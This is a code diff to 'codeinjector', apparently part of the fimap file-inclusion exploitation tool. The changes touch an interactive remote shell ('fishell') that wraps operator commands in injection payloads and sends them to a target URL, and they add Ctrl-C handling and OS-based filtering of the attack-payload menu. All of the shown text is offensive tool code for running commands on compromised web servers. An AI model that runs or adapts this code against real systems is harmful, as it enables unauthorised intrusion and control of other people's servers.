@@ -195,17 +195,20 @@ class codeinjector(baseClass):
                             cmd = raw_input("fishell@%s:%s$> " %(curusr,curdir))
                             if cmd == "q" or cmd == "quit": break
                             
-                            if (cmd.strip() != ""):
-                                commands = (xml2config.generateChangeDirectoryCommand(curdir, isUnix), cmd)
-                                cmds = xml2config.concatCommands(commands, isUnix)
-                                userload = item.generatePayload(cmds)
-                                code = self.__doHaxRequest(url, postdata, mode, userload, langClass, suffix)
-                                if (cmd.startswith("cd ")):
-                                    commands = (xml2config.generateChangeDirectoryCommand(curdir, isUnix), cmd, xml2config.getCurrentDirCode(isUnix))
+                            try:
+                                if (cmd.strip() != ""):
+                                    commands = (xml2config.generateChangeDirectoryCommand(curdir, isUnix), cmd)
                                     cmds = xml2config.concatCommands(commands, isUnix)
-                                    cmd = item.generatePayload(cmds)
-                                    curdir = self.__doHaxRequest(url, postdata, mode, cmd, langClass, suffix).strip()
-                                print code.strip()
+                                    userload = item.generatePayload(cmds)
+                                    code = self.__doHaxRequest(url, postdata, mode, userload, langClass, suffix)
+                                    if (cmd.startswith("cd ")):
+                                        commands = (xml2config.generateChangeDirectoryCommand(curdir, isUnix), cmd, xml2config.getCurrentDirCode(isUnix))
+                                        cmds = xml2config.concatCommands(commands, isUnix)
+                                        cmd = item.generatePayload(cmds)
+                                        curdir = self.__doHaxRequest(url, postdata, mode, cmd, langClass, suffix).strip()
+                                    print code.strip()
+                            except KeyboardInterrupt:
+                                print "\nCancelled by user."
                         print "See ya dude!"
                         print "Do not forget to close this security hole."
                         sys.exit(0)
@@ -414,11 +417,12 @@ class codeinjector(baseClass):
             choose[1] = "fimap_shell"
             idx = 2
             for payloadobj in langClass.getPayloads():
-                k = payloadobj.getName()
-                v = payloadobj
-                textarr.append("[%d] %s"%(idx,k))
-                choose[idx] = v
-                idx = idx +1
+                if (payloadobj.isForUnix() and isUnix or payloadobj.isForWindows() and not isUnix):
+                    k = payloadobj.getName()
+                    v = payloadobj
+                    textarr.append("[%d] %s"%(idx,k))
+                    choose[idx] = v
+                    idx = idx +1
 
         else:
             header = ":: Available Attacks - %s Only ::" %(language)
